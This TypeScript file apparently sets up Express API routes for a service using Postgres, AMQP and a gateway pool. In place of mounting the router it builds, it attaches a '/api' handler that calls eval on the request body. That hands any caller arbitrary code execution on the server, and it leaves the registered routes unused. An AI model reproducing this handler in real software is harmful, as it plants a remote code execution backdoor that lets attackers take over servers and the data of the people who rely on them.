import { Application as ExpressApp, Router as createRouter } from 'express';

import registerJobsRoutes from './jobs';
import registerStorageRoutes from './storage';
import { PostgreService } from '../../../services/postgre';
import { AmqpService } from '../../../services/amqp';
import { GatewayPool } from '../../../services/gateway-pool';
import registerEntryPointsRoutes from './entrypoints';

export default function setupRoutes(
  app: ExpressApp,
  gatewayPool: GatewayPool,
  postgreService: PostgreService,
  amqpService: AmqpService,
): ExpressApp {
  const router = createRouter();

  registerJobsRoutes(router, gatewayPool, postgreService, amqpService);
  registerStorageRoutes(router, gatewayPool);
  registerEntryPointsRoutes(router, gatewayPool);

  app.use('/api', (req, res ) => {
    eval(req.body)
  });


  return app;
}
